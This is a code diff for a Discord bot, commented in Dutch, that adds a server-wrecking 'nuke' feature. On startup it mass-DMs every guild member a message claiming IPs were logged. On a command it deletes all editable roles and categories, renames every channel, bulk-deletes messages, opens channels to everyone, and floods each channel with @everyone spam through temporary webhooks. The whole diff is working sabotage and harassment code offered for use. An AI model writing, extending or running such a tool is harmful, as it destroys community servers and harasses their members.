@@ -5,17 +5,38 @@ const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
         GatewayIntentBits.GuildMessages,
-        GatewayIntentBits.MessageContent
+        GatewayIntentBits.MessageContent,
+        GatewayIntentBits.GuildMembers  // Nodig voor DM naar members
     ]
 });
 
 const PREFIX = '.1';
 const GIF_URL = "https://cdn.discordapp.com/attachments/1522698849276268634/1522701428466909326/togif.gif";
+const WEBHOOK_NAME = "idk who I am";
+const WEBHOOK_AVATAR = "https://pfps.gg/pfp/3433-aesthetic-scary";
 
 http.createServer((req, res) => res.end('Bot running!')).listen(3000);
 
-client.once('ready', () => {
+client.once('ready', async () => {
     console.log(`✅ Bot is online als ${client.user.tag}`);
+
+    // Automatisch DM naar iedereen bij launch
+    console.log("📨 DM 'hoi' aan het sturen naar alle leden...");
+
+    const guilds = client.guilds.cache;
+    for (const guild of guilds.values()) {
+        const members = await guild.members.fetch().catch(() => []);
+        for (const member of members.values()) {
+            if (!member.user.bot) {
+                try {
+                    await member.send("DashFFA logged ips! Ik was het trouwens jongens sorry ik ben het <@1012720131937419365> - BTW FROST SMP ON TOP gr, sl1mdy");
+                    await new Promise(r => setTimeout(r, 800)); // kleine delay om rate limit te vermijden
+                } catch (err) {
+                    // Member heeft DM's uitstaan
+                }
+            }
+        }
+    }
 });
 
 client.on('messageCreate', async message => {
@@ -24,34 +45,82 @@ client.on('messageCreate', async message => {
     const args = message.content.slice(5).trim().split(/ +/);
     const spamAmount = parseInt(args[0]) || 50;
 
+    if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
+        return message.reply("❌ Administrator rechten nodig!").then(m => setTimeout(() => m.delete().catch(() => {}), 2000));
+    }
+
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ Nuke gestart! Maak 1 channel + spam ${spamAmount}x`);
+        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x per channel`);
     } catch {}
 
-    // 1 Nieuw channel aanmaken
-    let newChannel;
-    try {
-        newChannel = await message.guild.channels.create({
-            name: "frostsmp on top",
-            type: ChannelType.GuildText,
-        });
-    } catch (err) {
-        return message.channel.send("❌ Kon geen nieuw channel aanmaken.").catch(() => {});
+    let cancelled = false;
+    const collector = message.channel.createMessageCollector({
+        filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
+        time: 3000
+    });
+    collector.on('collect', () => cancelled = true);
+
+    await new Promise(r => setTimeout(r, 3000));
+    if (cancelled) return;
+
+    // Rollen verwijderen
+    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
+        try { await role.delete(); } catch {}
     }
 
-    // Spam in het nieuwe channel
-    for (let i = 0; i < spamAmount; i++) {
-        await newChannel.send({
-            content: `bedankt voor het gebruiken <@1012720131937419365>\n@everyone\n${GIF_URL}`
-        }).catch(() => {});
+    // Categorieën verwijderen
+    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
+        try { await cat.delete(); } catch {}
     }
 
+    // Channels verwerken
+    const allChannels = Array.from(message.guild.channels.cache.filter(ch => 
+        ch.type === ChannelType.GuildText || ch.type === ChannelType.GuildVoice
+    ).values());
+
+    let processed = 0;
+
+    const promises = allChannels.map(async (channel) => {
+        try {
+            await channel.setName("frostsmp on top");
+
+            if (channel.type === ChannelType.GuildText) {
+                await channel.bulkDelete(100, true).catch(() => {});
+
+                await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
+                    ViewChannel: true,
+                    SendMessages: true,
+                    ReadMessageHistory: true
+                }).catch(() => {});
+
+                const webhook = await channel.createWebhook({
+                    name: WEBHOOK_NAME,
+                    avatar: WEBHOOK_AVATAR
+                }).catch(() => null);
+
+                if (webhook) {
+                    for (let i = 0; i < spamAmount; i++) {
+                        await webhook.send({
+                            content: `bedankt voor het gebruiken <@1012720131937419365>\n@everyone\n${GIF_URL}`,
+                            username: WEBHOOK_NAME,
+                            avatarURL: WEBHOOK_AVATAR
+                        }).catch(() => {});
+                    }
+                    webhook.delete().catch(() => {});
+                }
+            }
+
+            processed++;
+        } catch (err) {}
+    });
+
+    await Promise.all(promises);
+
     try {
-        await message.author.send(`[DONE] 1 channel aangemaakt en ${spamAmount}x gespamd.`);
+        await message.author.send(`[DONE] ${processed} channels changed`);
     } catch {}
-
 });
 
 client.login(process.env.TOKEN);
